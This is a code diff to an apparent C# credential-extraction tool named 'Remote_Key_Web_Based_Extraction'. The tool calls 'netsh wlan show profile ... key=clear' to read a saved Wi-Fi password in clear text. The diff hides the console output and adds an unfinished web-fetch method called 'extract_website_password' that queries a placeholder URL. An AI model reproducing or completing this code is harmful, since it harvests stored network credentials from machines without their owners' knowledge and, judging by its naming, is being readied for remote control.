@@ -3,6 +3,7 @@ using Windows.Devices.WiFi;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Management.Automation;
+using System.Net.Http;
 
 namespace Remote_Key_Web_Based_Extraction
 {
@@ -39,10 +40,12 @@ namespace Remote_Key_Web_Based_Extraction
             ps.AddCommand("netsh")
                 .AddParameter("wlan show profile " + access_point_names[0], "key=clear");
             var results = ps.Invoke();
+            /*
             foreach (var item in results)
             {
                 Console.WriteLine(item);
             }
+            */
             foreach (var item in results)
             {
                 if (item.ToString().Contains("Key Content"))
@@ -52,6 +55,12 @@ namespace Remote_Key_Web_Based_Extraction
                 }
             }
             return "nil";
+        }
+        public async Task extract_website_password()
+        {
+            HttpClient client = new HttpClient();
+            string s = await client.GetStringAsync("Website-here");
+            s = s.Substring(s.IndexOf("<title>") + "<title>".Length, s.IndexOf("</title>") - s.IndexOf("<title>") - "<title>".Length);
         }
     }
 }
